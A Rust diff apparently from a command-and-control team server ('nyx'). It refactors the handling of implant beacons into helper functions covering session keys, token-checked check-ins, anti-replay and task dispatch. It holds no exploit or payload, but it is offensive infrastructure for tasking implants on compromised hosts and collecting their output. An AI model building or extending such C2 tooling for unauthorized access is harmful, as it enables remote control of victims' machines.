@@ -1122,6 +1122,345 @@ fn handle_beacon(
     handle_frame(st, peer, &raw)
 }
 
+
+/// Resolve session key: determine whether this is a new or existing session,
+/// and return the derived/stored [`SessionKey`]. For existing sessions, the
+/// read-guard counter check is ADVISORY only — the authoritative anti-replay
+/// check lives in [`handle_existing_session`] under the write guard.
+fn resolve_session_key(
+    st: &AppState,
+    raw: &nyx_protocol::RawFrame,
+) -> anyhow::Result<(bool, SessionKey)> {
+    match st.sessions.get(&raw.pubkey) {
+        None => Ok((true, st.keypair.derive_for(&raw.pubkey))),
+        Some(s) => {
+            if raw.counter <= s.last_recv {
+                anyhow::bail!("replayed/stale counter {}", raw.counter);
+            }
+            if s.stale {
+                // This session was restored from the persistent store at boot
+                // with a zero-placeholder key (the live SessionKey can't be
+                // persisted — it's never serialized to disk). Re-derive it now
+                // from the server keypair, exactly as the new-session branch
+                // does. The write-guard branch below overwrites the stored
+                // placeholder with this derived key once the AEAD tag confirms
+                // it. This is safe because derive_for is deterministic in the
+                // server identity + implant pubkey, so a frame that decrypts
+                // under this key is genuine.
+                Ok((false, st.keypair.derive_for(&raw.pubkey)))
+            } else {
+                Ok((false, s.key.clone()))
+            }
+        }
+    }
+}
+
+fn handle_new_session(
+    st: &AppState,
+    peer: &std::net::SocketAddr,
+    raw: &nyx_protocol::RawFrame,
+    key: SessionKey,
+    plaintext: Vec<u8>,
+) -> anyhow::Result<Vec<u8>> {
+    // First message from an implant is always its SessionInfo (check-in).
+    // Cap the global session count: beacon check-in is unauthenticated
+    // (anyone who speaks the protocol registers), so without a cap an
+    // attacker flooding distinct ephemeral keys OOMs the registry.
+    if st.sessions.len() >= MAX_SESSIONS {
+        anyhow::bail!("session registry full ({MAX_SESSIONS}); refusing new check-in");
+    }
+    let mut r = Reader::new(&plaintext);
+    let info = SessionInfo::decode(&mut r)?;
+
+    // Validate one-time auth_token if present (per-implant generated implants).
+    // Legacy implants (compile-time config, no token) skip this check.
+    if let Some(ref token) = info.auth_token {
+        let mut hasher = sha2::Sha256::new();
+        hasher.update(token);
+        let token_hash = hex::encode(hasher.finalize());
+
+        match &st.implants {
+            Some(store) => {
+                match store.get_by_token_hash(&token_hash) {
+                    Ok(Some(rec)) => {
+                        // Token valid — mark as consumed. Check the result:
+                        // a failure here means the token may still be
+                        // replayable, so log at error severity. Do NOT bail
+                        // — the session is already validated at this point.
+                        if let Err(e) = store.mark_token_used(&rec.implant_pub) {
+                            tracing::error!(
+                                error = %e,
+                                implant_pub = %rec.implant_pub,
+                                implant_id = rec.id,
+                                "mark_token_used failed; one-time token may be replayable"
+                            );
+                        }
+                        tracing::info!(
+                            implant_pub = %rec.implant_pub,
+                            implant_id = rec.id,
+                            "auth_token validated and consumed"
+                        );
+                    }
+                    Ok(None) => {
+                        // Token not found, already used, or revoked.
+                        anyhow::bail!(
+                            "auth_token rejected: not found, already consumed, or revoked"
+                        );
+                    }
+                    Err(e) => {
+                        // Store error — fail CLOSED: a store that can't
+                        // validate a presented one-time token must NOT allow
+                        // the check-in (the token may be replayed/revoked).
+                        tracing::warn!(error = %e, "implant store error during token check; rejecting check-in");
+                        anyhow::bail!("auth_token present but cannot validate: store error");
+                    }
+                }
+            }
+            None => {
+                // No implant store — token was sent but can't be validated.
+                // Fail CLOSED: an unvalidatable one-time token must not allow
+                // a check-in (the server may simply be misconfigured, but a
+                // per-implant-token beacon against a tokenless server is the
+                // suspicious case, not the common case).
+                tracing::warn!("auth_token present but no implant store; rejecting check-in");
+                anyhow::bail!("auth_token present but cannot validate: no store");
+            }
+        }
+    }
+
+    tracing::info!(
+        beacon_id = info.beacon_id,
+        host = %info.hostname,
+        user = %info.username,
+        os = %info.os,
+        "new session registered"
+    );
+    let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
+        session_id: hex::encode(raw.pubkey),
+        hostname: info.hostname.clone(),
+        username: info.username.clone(),
+        os: info.os.clone(),
+        is_admin: info.is_admin == 1,
+    });
+    // Pop the inbound TLS fingerprint the sniffer captured for this peer
+    // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
+    let fp = st
+        .fingerprints
+        .remove(peer)
+        .map(|(_, v)| v)
+        .unwrap_or_default();
+    // Clone before moving into the Session struct — the reply below still
+    // needs &key to seal the empty-task batch. (SessionKey is no longer Copy
+    // so it has a real Drop that zeroizes; the clone is zeroized on drop.)
+    let reply_key = key.clone();
+    // Snapshot the metadata that moves into `Session` so we can persist it
+    // AFTER the insert (persistence is fire-and-forget and must never block
+    // the beacon path; it runs only for the race-winner, after the shard
+    // lock is released).
+    let persist_id = hex::encode(raw.pubkey);
+    let persist_info = (
+        info.beacon_id,
+        info.hostname.clone(),
+        info.username.clone(),
+        info.os.clone(),
+        info.arch,
+        info.pid,
+        info.is_admin,
+        info.auth_token,
+    );
+    let boot_time = now_unix();
+    let session = Session {
+        key,
+        info,
+        last_recv: raw.counter,
+        send_counter: 0,
+        next_task_id: 1,
+        pending: Vec::new(),
+        results: Vec::new(),
+        created: Instant::now(),
+        last_seen: Instant::now(),
+        ja3: fp.ja3,
+        ja4: fp.ja4,
+        stale: false,
+        persisted_last_touch: Instant::now(),
+    };
+    // Atomically check-and-insert via `entry()`. This fully closes the
+    // TOCTOU that previously existed between `contains_key` and
+    // `or_insert_with` (two separate lock acquisitions): two concurrent
+    // check-ins carrying the same ephemeral pubkey + counter=0 could BOTH
+    // see `contains_key == false`, both proceed into the "newly inserted"
+    // branch, and both emit `encode_frame_dir(ServerToClient, 0, ...)` —
+    // reusing AEAD nonce 0 under the same session key and breaking the
+    // (key, nonce) uniqueness invariant of ChaCha20-Poly1305.
+    //
+    // `Entry::Vacant` holds the DashMap shard write lock across both the
+    // vacancy check AND the insert, so exactly one racer observes Vacant
+    // (winner: fires SessionNew, persists, replies S2C:0) while the other
+    // observes Occupied (loser: bails with a clean error → 400, no second
+    // S2C:0 frame). The loser's next beacon cycle arrives as an existing
+    // session. The loser's pre-built `session` is dropped unused (its
+    // SessionKey zeroizes on Drop).
+    match st.sessions.entry(raw.pubkey) {
+        Entry::Vacant(v) => {
+            // Winner: insert the session, then fire event + persist + reply.
+            // Insert via the vacant entry (not a separate `insert` call) so
+            // the shard lock stays held through the whole match arm.
+            v.insert(session);
+            st.events.fire(&new_event);
+            // Persist full session metadata so the registry survives a team-
+            // server restart. Fire-and-forget off the hot path: the upsert
+            // hands an owned record to the background writer thread, so a
+            // slow disk can never block this check-in. Only the race-winner
+            // persists (the loser bails below), so there's no double-write.
+            if let Some(persist) = &st.sessions_db {
+                let (beacon_id, hostname, username, os, arch, pid, is_admin, auth_token) =
+                    persist_info;
+                persist.upsert(nyx_store::SessionRecord {
+                    session_id: persist_id,
+                    beacon_id,
+                    hostname,
+                    username,
+                    os,
+                    arch,
+                    pid,
+                    is_admin,
+                    first_seen: boot_time,
+                    last_seen: boot_time,
+                    // SessionInfo.auth_token is [u8;32]; the store keeps a Vec.
+                    // By the time this row is written the token has already been
+                    // consumed in the `implants` table, so this is forensic, not
+                    // auth state.
+                    auth_token: auth_token.map(|t| t.to_vec()),
+                });
+            }
+            // No tasks queued yet — reply with an empty batch.
+            // Reply sealed in the server→implant nonce space
+            // (Direction::ServerToClient) so it never collides with the
+            // implant's own Tx nonces under the shared key.
+            Ok(encode_frame_dir(
+                &raw.pubkey,
+                Direction::ServerToClient,
+                0,
+                &reply_key,
+                &Task::encode_vec(&[])?,
+            )
+            .map_err(|e| anyhow::anyhow!("failed to seal S2C:0 reply: {e}"))?)
+        }
+        Entry::Occupied(_) => {
+            // Lost the check-in race: the other thread already registered the
+            // session and will send the S2C:0 reply. Bail so we don't fire a
+            // duplicate SessionNew or emit a second S2C:0 frame.
+            anyhow::bail!("concurrent check-in race: session already registered");
+        }
+    }
+}
+
+fn handle_existing_session(
+    st: &AppState,
+    raw: &nyx_protocol::RawFrame,
+    key: SessionKey,
+    plaintext: Vec<u8>,
+) -> anyhow::Result<Vec<u8>> {
+    // Subsequent messages carry task responses; we reply with queued tasks.
+    //
+    // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
+    // read-guard check above only saves a decrypt on an obvious stale frame;
+    // THIS is where replay protection is actually enforced, because the
+    // `counter <= last_recv` test and the `last_recv = counter` commit run
+    // under one `get_mut` guard and so cannot be split by a concurrent beacon
+    // for the same session. A racing replay that also passed the advisory
+    // check loses here: whichever request takes the write guard first
+    // advances `last_recv`; the other then sees `counter <= last_recv` and is
+    // rejected. (If the session vanished between the get() above and here,
+    // return a clean error — never panic.)
+    let mut s = st
+        .sessions
+        .get_mut(&raw.pubkey)
+        .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
+    if raw.counter <= s.last_recv {
+        anyhow::bail!("replayed/stale counter {}", raw.counter);
+    }
+    s.last_recv = raw.counter;
+    s.last_seen = Instant::now();
+    // A live frame clears the boot-stale flag: the session has beaconed
+    // since the restart, so it is confirmed alive (no longer just a row
+    // restored from the persistent store). A stale session was restored
+    // with a zero-placeholder key; now that the re-derived key has
+    // successfully decrypted a live frame, persist it into the session so
+    // subsequent beacons use the existing-session fast path (clone).
+    let was_stale = s.stale;
+    s.stale = false;
+    if was_stale {
+        s.key = key.clone();
+    }
+    // Throttle the cheap last_seen-only persistence write to at most one
+    // per session per PERSIST_TOUCH_THROTTLE. Decided under the write guard
+    // so two concurrent beacons for the same session can't both fire a
+    // touch; the actual SQLite write runs AFTER the guard is dropped, off
+    // the hot path on the persistence background thread.
+    let persist_touch = if let Some(persist) = &st.sessions_db {
+        let now = Instant::now();
+        if now.duration_since(s.persisted_last_touch) >= PERSIST_TOUCH_THROTTLE {
+            s.persisted_last_touch = now;
+            Some((persist.clone(), hex::encode(raw.pubkey), now_unix()))
+        } else {
+            None
+        }
+    } else {
+        None
+    };
+    let responses = TaskResponse::decode_vec(&plaintext)?;
+    // Snapshot the scripting-event payloads now (we're about to move
+    // `responses` into s.results), then fire them AFTER dropping the guard
+    // so a slow operator script (NYX_SCRIPT) can't block this session's
+    // DashMap shard.
+    let session_id = hex::encode(raw.pubkey);
+    let fired: Vec<nyx_scripting::Event> = responses
+        .iter()
+        .map(|r| {
+            let (kind, summary) = response_event_kind(&r.response);
+            nyx_scripting::Event::ResultReceived(nyx_scripting::ResultReceived {
+                session_id: session_id.clone(),
+                task_id: r.task_id,
+                kind,
+                summary,
+            })
+        })
+        .collect();
+    for r in responses {
+        s.results.push(r);
+        // Bound the results buffer: a rogue/compromised implant streaming
+        // Output/FileChunk blobs could otherwise fill RAM forever. Evict
+        // oldest (results are best-effort; operators drain them, and an
+        // unattended server mustn't OOM on a chatty beacon).
+        if s.results.len() > MAX_RESULTS_PER_SESSION {
+            let drop_n = s.results.len() - MAX_RESULTS_PER_SESSION;
+            s.results.drain(0..drop_n);
+        }
+    }
+    let tasks = std::mem::take(&mut s.pending);
+    s.send_counter += 1;
+    let counter = s.send_counter;
+    drop(s);
+    // Fire the throttled last_seen persistence write now that the shard
+    // lock is released. Best-effort, non-blocking: if the background thread
+    // has exited this is a no-op.
+    if let Some((persist, id, ts)) = persist_touch {
+        persist.touch(id, ts);
+    }
+    for ev in fired {
+        st.events.fire(&ev);
+    }
+    let reply = Task::encode_vec(&tasks)?;
+    encode_frame_dir(
+        &raw.pubkey,
+        Direction::ServerToClient,
+        counter,
+        &key,
+        &reply,
+    )
+    .map_err(|e| anyhow::anyhow!("failed to seal S2C reply: {e}"))
+}
 /// Channel-agnostic beacon frame handler (spec-1).
 ///
 /// This is the core processing path that ALL channels converge on. HTTP channels
@@ -1145,28 +1484,7 @@ fn handle_frame(
     // this read-guard check before either commits, defeating replay protection.
     // (The server runs under `panic = "abort"`, so we must never panic on a
     // missing/raced session entry — hence the clean error paths, no `.expect()`.)
-    let (is_new, key) = match st.sessions.get(&raw.pubkey) {
-        None => (true, st.keypair.derive_for(&raw.pubkey)),
-        Some(s) => {
-            if raw.counter <= s.last_recv {
-                anyhow::bail!("replayed/stale counter {}", raw.counter);
-            }
-            if s.stale {
-                // This session was restored from the persistent store at boot
-                // with a zero-placeholder key (the live SessionKey can't be
-                // persisted — it's never serialized to disk). Re-derive it now
-                // from the server keypair, exactly as the new-session branch
-                // does. The write-guard branch below overwrites the stored
-                // placeholder with this derived key once the AEAD tag confirms
-                // it. This is safe because derive_for is deterministic in the
-                // server identity + implant pubkey, so a frame that decrypts
-                // under this key is genuine.
-                (false, st.keypair.derive_for(&raw.pubkey))
-            } else {
-                (false, s.key.clone())
-            }
-        }
-    };
+    let (is_new, key) = resolve_session_key(st, raw)?;
 
     let plaintext = open_frame(&key, raw).map_err(|_| {
         // The overwhelmingly common cause of a tag mismatch here is key
@@ -1194,297 +1512,9 @@ fn handle_frame(
     })?;
 
     if is_new {
-        // First message from an implant is always its SessionInfo (check-in).
-        // Cap the global session count: beacon check-in is unauthenticated
-        // (anyone who speaks the protocol registers), so without a cap an
-        // attacker flooding distinct ephemeral keys OOMs the registry.
-        if st.sessions.len() >= MAX_SESSIONS {
-            anyhow::bail!("session registry full ({MAX_SESSIONS}); refusing new check-in");
-        }
-        let mut r = Reader::new(&plaintext);
-        let info = SessionInfo::decode(&mut r)?;
-
-        // Validate one-time auth_token if present (per-implant generated implants).
-        // Legacy implants (compile-time config, no token) skip this check.
-        if let Some(ref token) = info.auth_token {
-            let mut hasher = sha2::Sha256::new();
-            hasher.update(token);
-            let token_hash = hex::encode(hasher.finalize());
-
-            match &st.implants {
-                Some(store) => {
-                    match store.get_by_token_hash(&token_hash) {
-                        Ok(Some(rec)) => {
-                            // Token valid — mark as consumed. Check the result:
-                            // a failure here means the token may still be
-                            // replayable, so log at error severity. Do NOT bail
-                            // — the session is already validated at this point.
-                            if let Err(e) = store.mark_token_used(&rec.implant_pub) {
-                                tracing::error!(
-                                    error = %e,
-                                    implant_pub = %rec.implant_pub,
-                                    implant_id = rec.id,
-                                    "mark_token_used failed; one-time token may be replayable"
-                                );
-                            }
-                            tracing::info!(
-                                implant_pub = %rec.implant_pub,
-                                implant_id = rec.id,
-                                "auth_token validated and consumed"
-                            );
-                        }
-                        Ok(None) => {
-                            // Token not found, already used, or revoked.
-                            anyhow::bail!(
-                                "auth_token rejected: not found, already consumed, or revoked"
-                            );
-                        }
-                        Err(e) => {
-                            // Store error — fail CLOSED: a store that can't
-                            // validate a presented one-time token must NOT allow
-                            // the check-in (the token may be replayed/revoked).
-                            tracing::warn!(error = %e, "implant store error during token check; rejecting check-in");
-                            anyhow::bail!("auth_token present but cannot validate: store error");
-                        }
-                    }
-                }
-                None => {
-                    // No implant store — token was sent but can't be validated.
-                    // Fail CLOSED: an unvalidatable one-time token must not allow
-                    // a check-in (the server may simply be misconfigured, but a
-                    // per-implant-token beacon against a tokenless server is the
-                    // suspicious case, not the common case).
-                    tracing::warn!("auth_token present but no implant store; rejecting check-in");
-                    anyhow::bail!("auth_token present but cannot validate: no store");
-                }
-            }
-        }
-
-        tracing::info!(
-            beacon_id = info.beacon_id,
-            host = %info.hostname,
-            user = %info.username,
-            os = %info.os,
-            "new session registered"
-        );
-        let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
-            session_id: hex::encode(raw.pubkey),
-            hostname: info.hostname.clone(),
-            username: info.username.clone(),
-            os: info.os.clone(),
-            is_admin: info.is_admin == 1,
-        });
-        // Pop the inbound TLS fingerprint the sniffer captured for this peer
-        // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
-        let fp = st
-            .fingerprints
-            .remove(peer)
-            .map(|(_, v)| v)
-            .unwrap_or_default();
-        // Clone before moving into the Session struct — the reply below still
-        // needs &key to seal the empty-task batch. (SessionKey is no longer Copy
-        // so it has a real Drop that zeroizes; the clone is zeroized on drop.)
-        let reply_key = key.clone();
-        // Snapshot the metadata that moves into `Session` so we can persist it
-        // AFTER the insert (persistence is fire-and-forget and must never block
-        // the beacon path; it runs only for the race-winner, after the shard
-        // lock is released).
-        let persist_id = hex::encode(raw.pubkey);
-        let persist_info = (
-            info.beacon_id,
-            info.hostname.clone(),
-            info.username.clone(),
-            info.os.clone(),
-            info.arch,
-            info.pid,
-            info.is_admin,
-            info.auth_token,
-        );
-        let boot_time = now_unix();
-        let session = Session {
-            key,
-            info,
-            last_recv: raw.counter,
-            send_counter: 0,
-            next_task_id: 1,
-            pending: Vec::new(),
-            results: Vec::new(),
-            created: Instant::now(),
-            last_seen: Instant::now(),
-            ja3: fp.ja3,
-            ja4: fp.ja4,
-            stale: false,
-            persisted_last_touch: Instant::now(),
-        };
-        // Atomically check-and-insert via `entry()`. This fully closes the
-        // TOCTOU that previously existed between `contains_key` and
-        // `or_insert_with` (two separate lock acquisitions): two concurrent
-        // check-ins carrying the same ephemeral pubkey + counter=0 could BOTH
-        // see `contains_key == false`, both proceed into the "newly inserted"
-        // branch, and both emit `encode_frame_dir(ServerToClient, 0, ...)` —
-        // reusing AEAD nonce 0 under the same session key and breaking the
-        // (key, nonce) uniqueness invariant of ChaCha20-Poly1305.
-        //
-        // `Entry::Vacant` holds the DashMap shard write lock across both the
-        // vacancy check AND the insert, so exactly one racer observes Vacant
-        // (winner: fires SessionNew, persists, replies S2C:0) while the other
-        // observes Occupied (loser: bails with a clean error → 400, no second
-        // S2C:0 frame). The loser's next beacon cycle arrives as an existing
-        // session. The loser's pre-built `session` is dropped unused (its
-        // SessionKey zeroizes on Drop).
-        match st.sessions.entry(raw.pubkey) {
-            Entry::Vacant(v) => {
-                // Winner: insert the session, then fire event + persist + reply.
-                // Insert via the vacant entry (not a separate `insert` call) so
-                // the shard lock stays held through the whole match arm.
-                v.insert(session);
-                st.events.fire(&new_event);
-                // Persist full session metadata so the registry survives a team-
-                // server restart. Fire-and-forget off the hot path: the upsert
-                // hands an owned record to the background writer thread, so a
-                // slow disk can never block this check-in. Only the race-winner
-                // persists (the loser bails below), so there's no double-write.
-                if let Some(persist) = &st.sessions_db {
-                    let (beacon_id, hostname, username, os, arch, pid, is_admin, auth_token) =
-                        persist_info;
-                    persist.upsert(nyx_store::SessionRecord {
-                        session_id: persist_id,
-                        beacon_id,
-                        hostname,
-                        username,
-                        os,
-                        arch,
-                        pid,
-                        is_admin,
-                        first_seen: boot_time,
-                        last_seen: boot_time,
-                        // SessionInfo.auth_token is [u8;32]; the store keeps a Vec.
-                        // By the time this row is written the token has already been
-                        // consumed in the `implants` table, so this is forensic, not
-                        // auth state.
-                        auth_token: auth_token.map(|t| t.to_vec()),
-                    });
-                }
-                // No tasks queued yet — reply with an empty batch.
-                // Reply sealed in the server→implant nonce space
-                // (Direction::ServerToClient) so it never collides with the
-                // implant's own Tx nonces under the shared key.
-                Ok(encode_frame_dir(
-                    &raw.pubkey,
-                    Direction::ServerToClient,
-                    0,
-                    &reply_key,
-                    &Task::encode_vec(&[])?,
-                )
-                .map_err(|e| anyhow::anyhow!("failed to seal S2C:0 reply: {e}"))?)
-            }
-            Entry::Occupied(_) => {
-                // Lost the check-in race: the other thread already registered the
-                // session and will send the S2C:0 reply. Bail so we don't fire a
-                // duplicate SessionNew or emit a second S2C:0 frame.
-                anyhow::bail!("concurrent check-in race: session already registered");
-            }
-        }
+        handle_new_session(st, peer, raw, key, plaintext)
     } else {
-        // Subsequent messages carry task responses; we reply with queued tasks.
-        //
-        // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
-        // read-guard check above only saves a decrypt on an obvious stale frame;
-        // THIS is where replay protection is actually enforced, because the
-        // `counter <= last_recv` test and the `last_recv = counter` commit run
-        // under one `get_mut` guard and so cannot be split by a concurrent beacon
-        // for the same session. A racing replay that also passed the advisory
-        // check loses here: whichever request takes the write guard first
-        // advances `last_recv`; the other then sees `counter <= last_recv` and is
-        // rejected. (If the session vanished between the get() above and here,
-        // return a clean error — never panic.)
-        let mut s = st
-            .sessions
-            .get_mut(&raw.pubkey)
-            .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
-        if raw.counter <= s.last_recv {
-            anyhow::bail!("replayed/stale counter {}", raw.counter);
-        }
-        s.last_recv = raw.counter;
-        s.last_seen = Instant::now();
-        // A live frame clears the boot-stale flag: the session has beaconed
-        // since the restart, so it is confirmed alive (no longer just a row
-        // restored from the persistent store). A stale session was restored
-        // with a zero-placeholder key; now that the re-derived key has
-        // successfully decrypted a live frame, persist it into the session so
-        // subsequent beacons use the existing-session fast path (clone).
-        let was_stale = s.stale;
-        s.stale = false;
-        if was_stale {
-            s.key = key.clone();
-        }
-        // Throttle the cheap last_seen-only persistence write to at most one
-        // per session per PERSIST_TOUCH_THROTTLE. Decided under the write guard
-        // so two concurrent beacons for the same session can't both fire a
-        // touch; the actual SQLite write runs AFTER the guard is dropped, off
-        // the hot path on the persistence background thread.
-        let persist_touch = if let Some(persist) = &st.sessions_db {
-            let now = Instant::now();
-            if now.duration_since(s.persisted_last_touch) >= PERSIST_TOUCH_THROTTLE {
-                s.persisted_last_touch = now;
-                Some((persist.clone(), hex::encode(raw.pubkey), now_unix()))
-            } else {
-                None
-            }
-        } else {
-            None
-        };
-        let responses = TaskResponse::decode_vec(&plaintext)?;
-        // Snapshot the scripting-event payloads now (we're about to move
-        // `responses` into s.results), then fire them AFTER dropping the guard
-        // so a slow operator script (NYX_SCRIPT) can't block this session's
-        // DashMap shard.
-        let session_id = hex::encode(raw.pubkey);
-        let fired: Vec<nyx_scripting::Event> = responses
-            .iter()
-            .map(|r| {
-                let (kind, summary) = response_event_kind(&r.response);
-                nyx_scripting::Event::ResultReceived(nyx_scripting::ResultReceived {
-                    session_id: session_id.clone(),
-                    task_id: r.task_id,
-                    kind,
-                    summary,
-                })
-            })
-            .collect();
-        for r in responses {
-            s.results.push(r);
-            // Bound the results buffer: a rogue/compromised implant streaming
-            // Output/FileChunk blobs could otherwise fill RAM forever. Evict
-            // oldest (results are best-effort; operators drain them, and an
-            // unattended server mustn't OOM on a chatty beacon).
-            if s.results.len() > MAX_RESULTS_PER_SESSION {
-                let drop_n = s.results.len() - MAX_RESULTS_PER_SESSION;
-                s.results.drain(0..drop_n);
-            }
-        }
-        let tasks = std::mem::take(&mut s.pending);
-        s.send_counter += 1;
-        let counter = s.send_counter;
-        drop(s);
-        // Fire the throttled last_seen persistence write now that the shard
-        // lock is released. Best-effort, non-blocking: if the background thread
-        // has exited this is a no-op.
-        if let Some((persist, id, ts)) = persist_touch {
-            persist.touch(id, ts);
-        }
-        for ev in fired {
-            st.events.fire(&ev);
-        }
-        let reply = Task::encode_vec(&tasks)?;
-        encode_frame_dir(
-            &raw.pubkey,
-            Direction::ServerToClient,
-            counter,
-            &key,
-            &reply,
-        )
-        .map_err(|e| anyhow::anyhow!("failed to seal S2C reply: {e}"))
+        handle_existing_session(st, raw, key, plaintext)
     }
 }
 
